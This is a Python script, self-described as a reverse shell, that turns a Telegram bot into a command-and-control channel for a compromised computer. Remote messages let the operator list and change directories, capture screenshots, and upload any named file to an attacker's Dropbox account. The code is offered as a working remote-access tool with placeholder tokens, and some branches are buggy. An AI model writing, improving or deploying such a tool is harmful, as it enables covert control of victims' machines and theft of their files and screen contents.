import requests
import os
import dropbox
from pyautogui import screenshot, confirm
import datetime

class BotHandler:
    def __init__(self, token):
            self.token = token
            self.api_url = "https://api.telegram.org/bot{}/".format(token)

    #url = "https://api.telegram.org/bot<token>/"

    def get_updates(self, offset=0, timeout=30):
        method = 'getUpdates'
        params = {'timeout': timeout, 'offset': offset}
        resp = requests.get(self.api_url + method, params)
        result_json = resp.json()['result']
        return result_json

    def send_message(self, chat_id, text):
        params = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
        method = 'sendMessage'
        resp = requests.post(self.api_url + method, params)
        return resp



    def get_first_update(self):
                get_result = self.get_updates()

                if len(get_result) > 0:
                    last_update = get_result[0]
                else:
                    last_update = None

                return last_update


token = 'your bot token here'
rev_shell_bot = BotHandler(token) #Your bot's name

#for downloading dir_files
drop_access_token = 'dropbox token'
dbx = dropbox.Dropbox(drop_access_token)

def get_file_url(file_path):
    shared_link_metadata = dbx.sharing_create_shared_link_with_settings("file_path")
    return shared_link_metadata

def main():
    new_offset = 0
    print('Rev_shell started')

    while True:
        all_updates=rev_shell_bot.get_updates(new_offset)

        if len(all_updates) > 0:
            for current_update in all_updates:

                first_update_id = current_update['update_id']

                first_chat_id = current_update['message']['chat']['id']

                message = current_update['message']['text']

                if message.lower() == 'pwd':
                	rev_shell_bot.send_message(first_chat_id, os.getcwd())
                	new_offset = first_update_id + 1

                elif message[:2].lower() == 'cd':
                	try:
                		os.chdir(message[3:])
                		rev_shell_bot.send_message(first_chat_id, f"Directory changed\ncwd : {os.getcwd()}")
                	except:
                		rev_shell_bot.send_message(first_chat_id, "Directory not found or not possible to access it")
                	new_offset = first_update_id + 1

                elif message[:2].lower() == 'ls':
                	clean_answer=''
                	dir_files = os.listdir(".")
                	for i in dir_files:
                		if os.path.isfile(i[0])==True:
                			tipe="File"
                		else:
                			tipe="Dir"


                		size = os.path.getsize(i)
                		if size > 1e9:
                			size = f'{round(size/1e9, 3)} Go'
                		elif os.path.getsize(i) > 1e6:
                			size = f'{round(size/1e6, 3)} Mo'
                		elif size > 1e3:
                			size = f'{round(size/1e3, 3)} ko'

                		clean_answer +=f'{tipe} \t {i}........................{size}\n'

                	rev_shell_bot.send_message(first_chat_id, clean_answer)
                	new_offset = first_update_id + 1

                elif message[:8].lower() == "download":
                    with open(message[9:], 'rb') as fh:
                        dbx.files_upload(fh.read(), f'/rev_shell/{message[9:]}', mode=dropbox.files.WriteMode.overwrite)

                    rev_shell_bot.send_message(first_chat_id, 'file uploaded to dropbox')
                    new_offset = first_update_id + 1


                elif message[:10].lower() == "screenshot":
                    try:
                    	screen = screenshot()
                    	screen.save(r"screen.png")

                    except:
                        rev_shell_bot.send_message(first_chat_id, 'An error occured')
                        new_offset = first_update_id + 1
                else:
                    rev_shell_bot.send_message(first_chat_id, "Unknown command !")
                    new_offset = first_update_id + 1





if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
